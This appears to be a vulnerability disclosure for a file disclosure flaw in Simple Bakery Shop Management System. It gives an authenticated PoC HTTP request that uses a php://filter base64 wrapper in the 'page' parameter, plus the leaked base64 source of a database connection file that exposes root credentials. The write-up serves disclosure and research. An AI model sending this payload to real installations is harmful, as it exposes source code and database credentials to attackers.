# Simple Bakery Shop Management System File Disclosure
* `Note` => login to admin
# Exploit 
* Exploit with Burp Suite
```python
http://192.168.1.101:8080/bsms/?page=products
```
![image](https://user-images.githubusercontent.com/79050415/160247964-7c8adf9f-fb75-4754-a47d-0b6a31c553a1.png)
* Use Burp Suite capture request and payload => `Send`
![image](https://user-images.githubusercontent.com/79050415/160248025-19c24820-79ae-4522-93dc-f06f3ce3ca90.png)
* Then decode `Base64`
```python
PD9waHANCg0KQ2xhc3MgREJDb25uZWN0aW9uew0KICAgIHByb3RlY3RlZCAkZGI7DQogICAgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXsNCiAgICAgICAgJHRoaXMtPmRiPSBuZXcgbXlzcWxpKCdsb2NhbGhvc3QnLCdyb290JywnJywnYnNtc19kYicpOw0KICAgICAgICBpZighJHRoaXMtPmRiKXsNCiAgICAgICAgICAgIGRpZSgnRGF0YWJhc2UgQ29ubmVjdGlvbiBGYWlsZXMuIEVycm9yOiAnLiR0aGlzLT5kYi0+ZXJyb3IpOw0KICAgICAgICB9DQoNCiAgICB9DQogICAgZnVuY3Rpb24gZGJfY29ubmVjdCgpew0KICAgICAgICByZXR1cm4gJHRoaXMtPmRiOw0KICAgIH0NCiAgICBmdW5jdGlvbiBfX2Rlc3RydWN0KCl7DQogICAgICAgICAkdGhpcy0+ZGItPmNsb3NlKCk7DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBmb3JtYXRfbnVtKCRudW1iZXIgPSAnJywkZGVjaW1hbD0nJyl7DQogICAgaWYoaXNfbnVtZXJpYygkbnVtYmVyKSl7DQogICAgICAgICRleCA9IGV4cGxvZGUoIi4iLCRudW1iZXIpOw0KICAgICAgICAkZGVjX2xlbiA9IGlzc2V0KCRleFsxXSkgPyBzdHJsZW4oJGV4WzFdKSA6IDA7DQogICAgICAgIGlmKCFlbXB0eSgkZGVjaW1hbCkgfHwgaXNfbnVtZXJpYygkZGVjaW1hbCkpew0KICAgICAgICAgICAgcmV0dXJuIG51bWJlcl9mb3JtYXQoJG51bWJlciwkZGVjaW1hbCk7DQogICAgICAgIH1lbHNlew0KICAgICAgICAgICAgcmV0dXJuIG51bWJlcl9mb3JtYXQoJG51bWJlciwkZGVjX2xlbik7DQogICAgICAgIH0NCiAgICB9ZWxzZXsNCiAgICAgICAgcmV0dXJuICdJbnZhbGlkIGlucHV0Lic7DQogICAgfQ0KfQ0KDQokZGIgPSBuZXcgREJDb25uZWN0aW9uKCk7DQokY29ubiA9ICRkYi0+ZGJfY29ubmVjdCgpOw==
```
![image](https://user-images.githubusercontent.com/79050415/160248053-c84ba212-195d-42f3-8bca-bf84c485f810.png)

# Vulnerable Code
![image](https://user-images.githubusercontent.com/79050415/160248200-f24761ec-5dbb-4f04-94ae-b251b4127dbf.png)

# POC 
* `Request`
```python
GET /bsms/?page=php://filter/convert.base64-encode/resource=DBConnection HTTP/1.1
Host: 192.168.1.101:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.101:8080/bsms/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=0722dtqnb1dgvuono8uubajcae
Connection: close

```
